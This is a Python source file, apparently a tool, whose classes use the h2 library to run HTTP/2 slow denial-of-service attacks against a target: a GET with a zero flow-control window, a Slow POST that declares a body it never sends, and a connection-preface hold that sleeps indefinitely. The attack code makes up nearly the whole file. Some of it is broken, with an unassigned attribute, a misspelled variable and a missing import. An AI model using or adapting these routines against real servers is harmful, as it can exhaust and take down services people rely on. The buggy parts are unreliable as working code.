import h2.connection
import h2.events
import time

# Temporario
class NormalGet:
    def __init__(self, tls_connection, target, path):
        self.tls_connection = tls_connection
        self.target = target
        self.path = path
        self.conn = h2.connection.H2Connection()

    def initiate_attack(self):
        try:
            self.conn.initiate_connection()
            self.tls_connection.sendall(self.conn.data_to_send())

            headers = [
                (':method', 'GET'),
                (':authority', self.target),
                (':scheme', 'https'),
                (':path', self.path)
            ]
            
            stream_id = self.conn.get_next_available_stream_id()
            
            self.conn.send_headers(stream_id, headers, end_stream=True)
            self.tls_connection.sendall(self.conn.data_to_send())

            while True:
                data = self.tls_connection.recv(65535)
                if data:
                    events = self.conn.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.StreamEnded):
                            print(f"Stream {event.stream_id} terminado.")
                            return
                        elif isinstance(event, h2.events.ResponseReceived):
                            print(f"Resposta do servidor recebida: {event.headers}")
                    self.tls_connection.sendall(self.conn.data_to_send())
        except Exception as e:
            print(f"Erro durante o request: {e}")
        finally:
            self.tls_connection.close_connection()    

class CompleteGetHeaderZeroSettingInitialWindowSize:
    def __init__(self, tls_connection, target, path):
        self.tls_connection
        self.target = talget
        self.path = path
        self.conn = h2.connection.H2Connection() 

    def initiate_attack(self):
        try:
            self.conn.initiate_connection()
            
            settings = {h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0}
            self.conn.update_settings(settings)
            self.tls_connection.sendall(self.conn.data_to_send())

            headers = [
                (':method', 'GET'),
                (':authority', self.target),
                (':scheme', 'https'),
                (':path', self.path),
            ]
            stream_id = self.conn.get_next_available_stream_id()
            self.conn.send_headers(stream_id, headers, end_stream=True)
            self.tls_connection.sendall(self.conn.data_to_send())

            print(f"Request sent with window size set to zero. Server is expected to wait indefinitely...")

            while True:
                data = self.tls_connection.recv(65535)
                if data:
                    events = self.conn.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.StreamEnded):
                            print(f"Stream {event.stream_id} ended.")
                            return
                    self.tls_connection.sendall(self.conn.data_to_send())
        except Exception as e:
            print(f"Error during the attack: {e}")
        finally:
            self.tls_connection.close()

class CompletePostHeader:
    def __init__(self, tls_connection, target, path):
        self.tls_connection = tls_connection
        self.target = target
        self.path = path
        self.conn = h2.connection.H2Connection()

    def initiate_attack(self):
        """Inicia o ataque Slow POST."""
        try:
            self.conn.initiate_connection()
            self.tls_connection.sendall(self.conn.data_to_send())

            headers = [
                (':method', 'POST'),
                (':authority', self.target),
                (':scheme', 'https'),
                (':path', self.path),
                ('content-length', '10000'),
                ('content-type', 'application/x-www-form-urlencoded')
            ]
            stream_id = self.conn.get_next_available_stream_id()
            self.conn.send_headers(stream_id, headers, end_stream=False)
            self.tls_connection.sendall(self.conn.data_to_send())
            print("Cabeçalhos POST enviados. Aguardando resposta do servidor...")

            while True:
                data = self.tls_connection.recv(65535)
                if data:
                    events = self.conn.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.StreamEnded):
                            print(f"Stream {event.stream_id} terminado.")
                            return
                        elif isinstance(event, h2.events.ResponseReceived):
                            print(f"Resposta do servidor recebida: {event.headers}")
                    self.tls_connection.sendall(self.conn.data_to_send())
        except Exception as e:
            print(f"Erro durante o ataque: {e}")
        finally:
            self.tls_connection.close_connection()


class ConnectionPrefaceAttack:
    def __init__(self, tls_connection):
        self.tls_connection = tls_connection
        self.conn = h2.connection.H2Connection()

    def initiate_attack(self):
        """Inicia o ataque de Prefácio de Conexão."""
        try:
            self.conn.initiate_connection()
            self.tls_connection.sendall(self.conn.data_to_send())
            print("Prefácio de conexão enviado. Aguardando resposta do servidor...")

            while True:
                time.sleep(10)
        except Exception as e:
            print(f"Erro durante o ataque: {e}")
        finally:
            self.tls_connection.close_connection()





































